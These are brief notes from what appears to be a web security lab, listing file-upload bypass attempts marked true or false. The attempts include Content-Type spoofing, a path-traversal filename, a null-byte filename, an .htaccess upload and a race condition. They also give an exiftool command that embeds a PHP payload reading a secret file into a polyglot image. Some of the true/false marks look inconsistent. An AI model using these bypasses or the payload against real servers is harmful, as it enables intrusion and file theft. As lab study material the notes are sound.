Analysis:

Testing for File Upload Vulnerabilities :
1. test to upload file .php /false
2. test to modify in Content-type value it "image/png" /false 
3. test to change the directory in filename value it "..%2fexploit.php" /false
4. modify filename in burpsuite "lab-06.php%00.jpg" /false
5. test to upload file .htaccess /false
6. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata /true 
7. A simple way of doing this is to download and run ExifTool from the and run command /false
    "exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php"
8. we try race condition how do that by using burpsuite like in the video "https://youtu.be/UaQKMR5XOXk" /true
